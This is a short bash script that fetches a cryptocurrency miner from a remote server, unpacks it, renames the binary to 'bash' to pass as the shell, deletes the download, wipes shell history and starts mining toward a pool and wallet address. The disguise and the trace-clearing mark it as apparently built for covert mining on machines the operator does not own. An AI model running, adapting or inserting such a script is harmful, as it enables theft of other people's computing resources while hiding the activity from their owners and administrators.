#!/bin/bash
wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz 
tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz 
chmod +x danila-miner 
mv danila-miner bash
rm -rvf danila-miner-2.3.1-ubuntu-bionic.tar.gz
history -cr
./bash run https://server1.whalestonpool.com EQA7bubNSQ1ovZ2yr77a0XYaoH4NF6PzVn5H1qeYMgf0plZc
